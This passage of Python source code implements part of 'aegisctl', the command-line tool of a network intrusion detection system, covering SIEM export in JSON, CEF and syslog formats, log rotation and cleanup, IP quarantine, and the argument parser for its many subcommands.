        print(f"ERROR: unknown quarantine subcommand: {subcmd!r}")
        return 2


# =====================================================================
# G45 - Production features (siem/logs export)
# =====================================================================


def cmd_siem(args: argparse.Namespace) -> int:
    """SIEM export commands (export events in syslog/CEF/JSON format)."""
    subcmd = args.subcommand
    if subcmd == "export":
        return _siem_export(args)
    elif subcmd == "syslog":
        return _siem_syslog(args)
    else:
        print(f"ERROR: unknown siem subcommand: {subcmd!r}")
        return 2


def _siem_export(args: argparse.Namespace) -> int:
    """Export forensic events in SIEM-compatible format (JSON array or CEF)."""
    if not FORENSIC_LOG.exists():
        print(f"No log file found: {FORENSIC_LOG}")
        return 1

    if not args.output:
        print("ERROR: --output is required for 'siem export'")
        return 2

    output_path = Path(args.output)
    if not output_path.is_absolute():
        output_path = REPO_ROOT / args.output

    fmt = args.format or "json"
    if fmt not in ("json", "cef", "syslog"):
        print(f"ERROR: --format must be json/cef/syslog, got {fmt!r}")
        return 2

    records = []
    try:
        with open(FORENSIC_LOG, "r", encoding="utf-8", errors="replace") as f:
            for line in f:
                line = line.strip()
                if not line:
                    continue
                try:
                    records.append(json.loads(line))
                except (json.JSONDecodeError, ValueError):
                    continue
    except OSError as e:
        print(f"ERROR reading log: {e}")
        return 1

    if not records:
        print("No records to export")
        return 0

    # Apply severity filter if specified
    if args.severity:
        records = [r for r in records if r.get("level", r.get("severity", "")).lower()
                   == args.severity.lower()]

    # Apply limit if specified
    if args.limit and len(records) > args.limit:
        records = records[-args.limit:]

    try:
        with open(output_path, "w", encoding="utf-8") as f:
            if fmt == "json":
                json.dump(records, f, indent=2, ensure_ascii=False)
            elif fmt == "cef":
                # Common Event Format (CEF) -- used by Splunk, ArcSight
                for r in records:
                    ts = r.get("ts_ms", r.get("timestamp", 0))
                    severity = r.get("level", r.get("severity", "Info"))
                    event = r.get("event", r.get("attack_type", "Unknown"))
                    src = r.get("src_ip", "0.0.0.0")
                    rule = r.get("rule", r.get("rule_id", "Unknown"))
                    # CEF: CEF:Version|Vendor|Product|DevVersion|SignatureID|Name|Severity|Extension
                    f.write(f"CEF:0|AEGIS|NIDS|1.0|{rule}|{event}|{severity}|"
                            f"src={src} rt={ts} act={r.get('action', 'alert')}\n")
            elif fmt == "syslog":
                # Syslog format (RFC 5424 simplified)
                import datetime
                for r in records:
                    ts = r.get("ts_ms", 0)
                    if ts:
                        dt = datetime.datetime.fromtimestamp(ts / 1000 if ts > 1e12 else ts)
                        timestamp = dt.strftime("%b %d %H:%M:%S")
                    else:
                        timestamp = datetime.datetime.now().strftime("%b %d %H:%M:%S")
                    severity = r.get("level", r.get("severity", "INFO"))
                    event = r.get("event", r.get("attack_type", "Unknown"))
                    src = r.get("src_ip", "0.0.0.0")
                    rule = r.get("rule", r.get("rule_id", "Unknown"))
                    # Syslog: <priority>timestamp hostname program[pid]: message
                    priority = {"Critical": 2, "High": 4, "Medium": 6, "Low": 7}.get(severity, 6)
                    f.write(f"<{priority}>{timestamp} aegis-nids aegis[{os.getpid()}]: "
                            f"[{severity}] {event} src={src} rule={rule}\n")
    except OSError as e:
        print(f"ERROR writing output: {e}")
        return 1

    print(f"Exported {len(records)} records to {output_path}")
    print(f"Format: {fmt}")
    if args.severity:
        print(f"Filter: severity={args.severity}")
    if args.limit:
        print(f"Limit: last {args.limit} records")
    return 0


def _siem_syslog(args: argparse.Namespace) -> int:
    """Stream events to a syslog server via UDP."""
    if not FORENSIC_LOG.exists():
        print(f"No log file found: {FORENSIC_LOG}")
        return 1

    host = args.host or "127.0.0.1"
    port = args.port or 514

    records = []
    try:
        with open(FORENSIC_LOG, "r", encoding="utf-8", errors="replace") as f:
            for line in f:
                line = line.strip()
                if not line:
                    continue
                try:
                    records.append(json.loads(line))
                except (json.JSONDecodeError, ValueError):
                    continue
    except OSError as e:
        print(f"ERROR reading log: {e}")
        return 1

    if not records:
        print("No records to stream")
        return 0

    # Apply severity filter
    if args.severity:
        records = [r for r in records if r.get("level", r.get("severity", "")).lower()
                   == args.severity.lower()]

    # Apply limit
    if args.limit and len(records) > args.limit:
        records = records[-args.limit:]

    import datetime
    sent = 0
    failed = 0
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            s.settimeout(2.0)
            for r in records:
                ts = r.get("ts_ms", 0)
                if ts:
                    dt = datetime.datetime.fromtimestamp(ts / 1000 if ts > 1e12 else ts)
                    timestamp = dt.strftime("%b %d %H:%M:%S")
                else:
                    timestamp = datetime.datetime.now().strftime("%b %d %H:%M:%S")
                severity = r.get("level", r.get("severity", "INFO"))
                event = r.get("event", r.get("attack_type", "Unknown"))
                src = r.get("src_ip", "0.0.0.0")
                rule = r.get("rule", r.get("rule_id", "Unknown"))
                priority = {"Critical": 2, "High": 4, "Medium": 6, "Low": 7}.get(severity, 6)
                message = f"<{priority}>{timestamp} aegis-nids aegis: [{severity}] {event} src={src} rule={rule}\n"
                try:
                    s.sendto(message.encode("utf-8"), (host, port))
                    sent += 1
                except (socket.timeout, OSError):
                    failed += 1
    except Exception as e:
        print(f"ERROR: {e}")
        return 1

    print(f"Syslog stream: {sent} sent, {failed} failed -> {host}:{port}")
    return 0 if failed == 0 else 1


def cmd_logs(args: argparse.Namespace) -> int:
    """Log management commands (rotate/clean/size)."""
    subcmd = args.subcommand
    if subcmd == "rotate":
        return _logs_rotate(args)
    elif subcmd == "clean":
        return _logs_clean(args)
    elif subcmd == "size":
        return _logs_size(args)
    else:
        print(f"ERROR: unknown logs subcommand: {subcmd!r}")
        return 2


def _logs_rotate(args: argparse.Namespace) -> int:
    """Rotate all log files that exceed the size threshold."""
    logs_dir = REPO_ROOT / "logs"
    if not logs_dir.exists():
        print("No logs directory found.")
        return 0

    max_size = (args.max_size or 10) * 1024 * 1024  # default 10 MB
    rotated = 0
    skipped = 0

    for log_file in logs_dir.glob("*.log"):
        if log_file.stat().st_size > max_size:
            _rotate_log(log_file)
            print(f"  [ROTATED] {log_file.name} ({log_file.stat().st_size // 1024} KB -> 0)")
            rotated += 1
        else:
            size_kb = log_file.stat().st_size // 1024
            print(f"  [OK]      {log_file.name} ({size_kb} KB)")
            skipped += 1

    print(f"\nRotated: {rotated}, OK: {skipped}")
    return 0


def _logs_clean(args: argparse.Namespace) -> int:
    """Truncate all log files to 0 bytes."""
    logs_dir = REPO_ROOT / "logs"
    if not logs_dir.exists():
        print("No logs directory found.")
        return 0

    cleaned = 0
    for log_file in logs_dir.glob("*.log"):
        try:
            log_file.write_bytes(b"")
            cleaned += 1
            print(f"  [CLEANED] {log_file.name}")
        except OSError:
            print(f"  [SKIP]    {log_file.name} (locked?)")

    # Also clean rotated logs if --all flag
    if args.all:
        for rotated in logs_dir.glob("*.log.*"):
            try:
                rotated.unlink()
                print(f"  [DELETED] {rotated.name}")
            except OSError:
                pass

    print(f"\nCleaned: {cleaned} log files")
    return 0


def _logs_size(args: argparse.Namespace) -> int:
    """Show size of all log files."""
    logs_dir = REPO_ROOT / "logs"
    if not logs_dir.exists():
        print("No logs directory found.")
        return 0

    total_size = 0
    print(f"\n{'Log File':<30} {'Size':>12}")
    print("-" * 45)
    for log_file in sorted(logs_dir.glob("*.log*")):
        size = log_file.stat().st_size
        total_size += size
        if size > 1024 * 1024:
            size_str = f"{size / (1024 * 1024):.1f} MB"
        elif size > 1024:
            size_str = f"{size / 1024:.1f} KB"
        else:
            size_str = f"{size} B"
        print(f"  {log_file.name:<28} {size_str:>12}")
    print("-" * 45)
    if total_size > 1024 * 1024:
        total_str = f"{total_size / (1024 * 1024):.1f} MB"
    else:
        total_str = f"{total_size / 1024:.1f} KB"
    print(f"  {'TOTAL':<28} {total_str:>12}")
    return 0


def _quarantine_add(args: argparse.Namespace) -> int:
    """Quarantine an IP (block all traffic + alert).

    Quarantine is stricter than a simple block -- it also:
      - Adds the IP to the block list
      - Marks it as quarantined (higher priority)
      - Logs the quarantine event
    """
    if not args.ip:
        print("ERROR: --ip is required for 'quarantine add'")
        return 2

    # Add to quarantine list
    q_data = _load_quarantine()
    quarantined = q_data.get("quarantined_ips", [])
    for entry in quarantined:
        if entry.get("ip") == args.ip:
            print(f"IP {args.ip} is already QUARANTINED (since {entry.get('quarantined_at', '?')})")
            return 0

    entry = {
        "ip": args.ip,
        "quarantined_at": int(time.time()),
        "reason": args.reason or "Manual quarantine via aegisctl",
        "quarantined_by": "aegisctl",
    }
    quarantined.append(entry)
    q_data["quarantined_ips"] = quarantined
    _save_quarantine(q_data)

    # Also add to block list (with quarantine reason)
    block_data = _load_block_list()
    blocked = block_data.get("blocked_ips", [])
    blocked.append({
        "ip": args.ip,
        "blocked_at": int(time.time()),
        "duration": 0,
        "reason": f"QUARANTINE: {entry['reason']}",
        "blocked_by": "aegisctl quarantine",
    })
    block_data["blocked_ips"] = blocked
    _save_block_list(block_data)

    # Signal core
    _signal_core_block(args.ip)

    print(f"IP {args.ip} QUARANTINED")
    print(f"  - Added to quarantine list: {QUARANTINE_FILE.relative_to(REPO_ROOT)}")
    print(f"  - Added to block list: {BLOCK_LIST_FILE.relative_to(REPO_ROOT)}")
    print(f"  - Reason: {entry['reason']}")
    print(f"  - All traffic from {args.ip} will be dropped")
    return 0


def _quarantine_remove(args: argparse.Namespace) -> int:
    """Remove an IP from quarantine (also unblocks it)."""
    if not args.ip:
        print("ERROR: --ip is required for 'quarantine remove'")
        return 2

    # Remove from quarantine list
    q_data = _load_quarantine()
    quarantined = q_data.get("quarantined_ips", [])
    original_q_count = len(quarantined)
    q_data["quarantined_ips"] = [e for e in quarantined if e.get("ip") != args.ip]
    if len(q_data["quarantined_ips"]) == original_q_count:
        print(f"IP {args.ip} is NOT in the quarantine list")
        return 0
    _save_quarantine(q_data)

    # Also remove from block list
    block_data = _load_block_list()
    blocked = block_data.get("blocked_ips", [])
    block_data["blocked_ips"] = [e for e in blocked if e.get("ip") != args.ip]
    _save_block_list(block_data)

    # Signal core to unblock
    _signal_core_unblock(args.ip)

    print(f"IP {args.ip} removed from quarantine and unblocked")
    return 0


def _quarantine_list(args: argparse.Namespace) -> int:
    """List all quarantined IPs."""
    q_data = _load_quarantine()
    quarantined = q_data.get("quarantined_ips", [])

    if not quarantined:
        print("No IPs are currently quarantined.")
        return 0

    print(f"\n{'IP Address':<18} {'Quarantined At':<22} {'Reason'}")
    print("-" * 70)
    for entry in quarantined:
        ip = entry.get("ip", "?")
        q_at = entry.get("quarantined_at", 0)
        ts = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(q_at)) if q_at else "?"
        reason = entry.get("reason", "?")[:40]
        print(f"{ip:<18} {ts:<22} {reason}")
    print(f"\nTotal: {len(quarantined)} IP(s) quarantined")
    return 0

def main() -> int:
    parser = argparse.ArgumentParser(
        prog="aegisctl",
        description="AEGIS NIDS Command/Control CLI (v1, Gate C)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=__doc__,
    )
    sub = parser.add_subparsers(dest="command", required=True, metavar="COMMAND")

    # version
    p = sub.add_parser("version", help="Show version of every built binary")
    p.add_argument("--component", "-c", help="Show version for a specific component")
    p.set_defaults(func=cmd_version)

    # status
    p = sub.add_parser("status", help="Show runtime state of every component")
    p.add_argument("--component", "-c", help="Show status for a specific component")
    p.set_defaults(func=cmd_status)

    # health
    p = sub.add_parser("health", help="Probe HEALTH endpoints of every component")
    p.add_argument("--component", "-c", help="Probe HEALTH for a specific component")
    p.set_defaults(func=cmd_health)

    # start
    p = sub.add_parser("start", help="Start a component process")
    g = p.add_mutually_exclusive_group(required=True)
    g.add_argument("--component", "-c", help="Start a specific component")
    g.add_argument("--all", action="store_true", help="Start all components")
    p.set_defaults(func=cmd_start)

    # stop
    p = sub.add_parser("stop", help="Stop a running component process")
    g = p.add_mutually_exclusive_group(required=True)
    g.add_argument("--component", "-c", help="Stop a specific component")
    g.add_argument("--all", action="store_true", help="Stop all components")
    p.set_defaults(func=cmd_stop)

    # restart
    p = sub.add_parser("restart", help="Restart a single component")
    p.add_argument("--component", "-c", required=True, help="Component to restart")
    p.set_defaults(func=cmd_restart)

    # diagnose
    p = sub.add_parser("diagnose", help="Collect diagnostic info")
    p.set_defaults(func=cmd_diagnose)

    # golden (Gate B - Integrated)
    p = sub.add_parser("golden", help="Run the golden-path end-to-end pipeline test")
    p.set_defaults(func=cmd_golden)

    # --- Gate D - Inspection commands (rules/events/forensic) ---

    # rules (with subcommands: list/show/validate)
    p = sub.add_parser("rules", help="Read-only inspection of detection rules")
    rules_sub = p.add_subparsers(dest="subcommand", required=True, metavar="SUBCOMMAND")
    p_list = rules_sub.add_parser("list", help="List all rules (optionally filtered by --category or --severity)")
    p_list.add_argument("--category", help="Filter by category (e.g. Injection)")
    p_list.add_argument("--severity", help="Filter by severity (Low/Medium/High/Critical)")
    p_show = rules_sub.add_parser("show", help="Show full details of a single rule")
    p_show.add_argument("--id", required=True, help="Rule ID (e.g. R0056)")
    rules_sub.add_parser("validate", help="Validate the Rules.json file structure")
    p.set_defaults(func=cmd_rules)

    # events (with subcommands: tail/count/stats)
    p = sub.add_parser("events", help="Read-only inspection of events from the NDJSON log")
    events_sub = p.add_subparsers(dest="subcommand", required=True, metavar="SUBCOMMAND")
    p_tail = events_sub.add_parser("tail", help="Show the last N events")
    p_tail.add_argument("--count", "-n", type=int, default=10, help="Number of events (default: 10)")
    events_sub.add_parser("count", help="Count total events in the log")
    events_sub.add_parser("stats", help="Show event statistics (severity/policy breakdown)")
    p.set_defaults(func=cmd_events)

    # forensic (with subcommands: show/search/export)
    p = sub.add_parser("forensic", help="Read-only inspection of forensic records")
    forensic_sub = p.add_subparsers(dest="subcommand", required=True, metavar="SUBCOMMAND")
    p_show = forensic_sub.add_parser("show", help="Show a specific forensic record by 1-based index")
    p_show.add_argument("--id", type=int, required=True, help="Record index (1-based)")
    p_search = forensic_sub.add_parser("search", help="Search records by field=value")
    p_search.add_argument("--field", required=True, help="Field name to search (e.g. rule_id, src_ip)")
    p_search.add_argument("--value", required=True, help="Value to match")
    p_search.add_argument("--limit", type=int, default=20, help="Max results (default: 20)")
    p_export = forensic_sub.add_parser("export", help="Export the log to CSV or JSON")
    p_export.add_argument("--output", "-o", required=True, help="Output file path")
    p_export.add_argument("--format", "-f", choices=["json", "csv"], default="json",
                          help="Output format (default: json)")
    p.set_defaults(func=cmd_forensic)

    # --- Gate E - Policy & Testing commands (policy/simulate/canary) ---

    # policy (with subcommands: list/show/reload/enable/disable)
    p = sub.add_parser("policy", help="Policy management (list/show/reload/enable/disable)")
    policy_sub = p.add_subparsers(dest="subcommand", required=True, metavar="SUBCOMMAND")
    policy_sub.add_parser("list", help="List all rules with enabled/disabled state")
    p_show = policy_sub.add_parser("show", help="Show a single rule with its state")
    p_show.add_argument("--id", required=True, help="Rule ID (e.g. R0056)")
    policy_sub.add_parser("reload", help="Hot-reload rules from disk (SIGHUP to core)")
    p_en = policy_sub.add_parser("enable", help="Enable a rule (remove from disabled list)")
    p_en.add_argument("--id", required=True, help="Rule ID to enable")
    p_dis = policy_sub.add_parser("disable", help="Disable a rule (add to disabled list)")
    p_dis.add_argument("--id", required=True, help="Rule ID to disable")
    p.set_defaults(func=cmd_policy)

    # simulate (with subcommands: attack/packet/flood/replay)
    p = sub.add_parser("simulate", help="Attack simulation (attack/packet/flood/replay)")
    sim_sub = p.add_subparsers(dest="subcommand", required=True, metavar="SUBCOMMAND")
    p_atk = sim_sub.add_parser("attack", help="Send a predefined attack pattern")
    p_atk.add_argument("--type", "-t", required=True,
                       help="Attack type: SQL_INJECTION, CMD_INJECTION, XSS, "
                            "PATH_TRAVERSAL, PORT_SCAN, LOG4J, BRUTE_FORCE, DATA_EXFIL")
    p_atk.add_argument("--src-ip", help="Source IP (default: 10.0.0.99)")
    sim_sub.add_parser("list", help="List available attack types")
    p_pkt = sim_sub.add_parser("packet", help="Send a custom packet event")
    p_pkt.add_argument("--src-ip", help="Source IP (default: 10.0.0.99)")
    p_pkt.add_argument("--dst-port", type=int, default=80, help="Destination port (default: 80)")
    p_pkt.add_argument("--payload", help="Payload string")
    p_flood = sim_sub.add_parser("flood", help="Send a flood of events")
    p_flood.add_argument("--count", type=int, default=50, help="Number of events (default: 50)")
    p_flood.add_argument("--rate", type=int, default=50, help="Events per second (default: 50)")
    p_replay = sim_sub.add_parser("replay", help="Replay events from an NDJSON log file")
    p_replay.add_argument("--file", "-f", required=True, help="NDJSON log file to replay")
    p_replay.add_argument("--delay", type=float, default=0.0, help="Delay between events (seconds)")
    p.set_defaults(func=cmd_simulate)

    # canary (with subcommands: run/status/report)
    p = sub.add_parser("canary", help="Canary tests (run/status/report)")
    canary_sub = p.add_subparsers(dest="subcommand", required=True, metavar="SUBCOMMAND")
    p_run = canary_sub.add_parser("run", help="Run canary tests")
    p_run.add_argument("--test", "-t", help="Run a specific test by name (default: all)")
    canary_sub.add_parser("status", help="Show status of last canary run")
    canary_sub.add_parser("report", help="Generate a detailed canary report")
    p.set_defaults(func=cmd_canary)

    # --- Gate F - Enforcement commands (block/enforce/quarantine) ---

    # block (with subcommands: add/remove/list/clear)
    p = sub.add_parser("block", help="IP block management (add/remove/list/clear)")
    block_sub = p.add_subparsers(dest="subcommand", required=True, metavar="SUBCOMMAND")
    p_add = block_sub.add_parser("add", help="Block an IP address")
    p_add.add_argument("--ip", required=True, help="IP address to block (e.g. 1.2.3.4)")
    p_add.add_argument("--duration", type=int, help="Block duration in seconds (0=permanent)")
    p_add.add_argument("--reason", help="Reason for blocking")
    p_rm = block_sub.add_parser("remove", help="Remove an IP block")
    p_rm.add_argument("--ip", required=True, help="IP address to unblock")
    block_sub.add_parser("list", help="List all blocked IPs")
    block_sub.add_parser("clear", help="Clear all blocked IPs")
    p.set_defaults(func=cmd_block)

    # enforce (with subcommands: status/enable/disable/push)
    p = sub.add_parser("enforce", help="PEP enforcement management (status/enable/disable/push)")
    enforce_sub = p.add_subparsers(dest="subcommand", required=True, metavar="SUBCOMMAND")
    enforce_sub.add_parser("status", help="Show PEP enforcement status")
    enforce_sub.add_parser("enable", help="Enable PEP enforcement (enforce Drop/Block rules)")
    enforce_sub.add_parser("disable", help="Disable PEP enforcement (fail-open mode, alerts only)")
    p_push = enforce_sub.add_parser("push", help="Push a policy file to the PEP")
    p_push.add_argument("--policy", required=True, help="Path to policy JSON file (copies to config/Rules.json)")
    p.set_defaults(func=cmd_enforce)

    # quarantine (with subcommands: add/remove/list)
    p = sub.add_parser("quarantine", help="Quarantine management (add/remove/list)")
    quar_sub = p.add_subparsers(dest="subcommand", required=True, metavar="SUBCOMMAND")
    p_q_add = quar_sub.add_parser("add", help="Quarantine an IP (block all traffic + alert)")
    p_q_add.add_argument("--ip", required=True, help="IP address to quarantine")
    p_q_add.add_argument("--reason", help="Reason for quarantine")
    p_q_rm = quar_sub.add_parser("remove", help="Remove an IP from quarantine")
    p_q_rm.add_argument("--ip", required=True, help="IP address to release")
    quar_sub.add_parser("list", help="List all quarantined IPs")
    p.set_defaults(func=cmd_quarantine)

    # --- G45 - Production features (siem/logs) ---

    # siem (with subcommands: export/syslog)
    p = sub.add_parser("siem", help="SIEM export (export/syslog)")
    siem_sub = p.add_subparsers(dest="subcommand", required=True, metavar="SUBCOMMAND")
    p_exp = siem_sub.add_parser("export", help="Export events to file (JSON/CEF/syslog format)")
    p_exp.add_argument("--output", "-o", required=True, help="Output file path")
    p_exp.add_argument("--format", "-f", choices=["json", "cef", "syslog"], default="json",
                       help="Output format (default: json)")
    p_exp.add_argument("--severity", help="Filter by severity (Low/Medium/High/Critical)")
    p_exp.add_argument("--limit", type=int, help="Export only the last N records")
    p.set_defaults(func=cmd_siem)
    p_sys = siem_sub.add_parser("syslog", help="Stream events to syslog server via UDP")
    p_sys.add_argument("--host", default="127.0.0.1", help="Syslog server host (default: 127.0.0.1)")
    p_sys.add_argument("--port", type=int, default=514, help="Syslog server port (default: 514)")
    p_sys.add_argument("--severity", help="Filter by severity")
    p_sys.add_argument("--limit", type=int, help="Stream only the last N records")
    p.set_defaults(func=cmd_siem)

    # logs (with subcommands: rotate/clean/size)
    p = sub.add_parser("logs", help="Log management (rotate/clean/size)")
    logs_sub = p.add_subparsers(dest="subcommand", required=True, metavar="SUBCOMMAND")
    p_rot = logs_sub.add_parser("rotate", help="Rotate log files that exceed size threshold")
    p_rot.add_argument("--max-size", type=int, default=10, help="Max size in MB before rotation (default: 10)")
    p_clean = logs_sub.add_parser("clean", help="Truncate all log files to 0 bytes")
    p_clean.add_argument("--all", action="store_true", help="Also delete rotated log files (*.log.*)")
    logs_sub.add_parser("size", help="Show size of all log files")
    p.set_defaults(func=cmd_logs)

    args = parser.parse_args()
    return args.func(args)


if __name__ == "__main__":
    sys.exit(main())
